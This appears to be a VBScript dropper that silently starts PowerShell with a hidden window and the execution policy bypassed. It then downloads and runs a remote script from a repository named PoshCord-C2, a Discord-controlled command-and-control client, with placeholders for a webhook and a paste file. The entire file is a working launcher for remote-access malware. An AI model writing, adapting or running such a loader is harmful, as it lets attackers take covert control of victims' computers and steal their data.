Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $hookurl='YOUR_WEBHOOK_HERE' ; $ghurl = 'YOUR_PASTEBIN_FILE_HERE' ; irm https://raw.githubusercontent.com/beigeworm/PoshCord-C2/main/Discord-C2-Client.ps1 | iex", 0, True

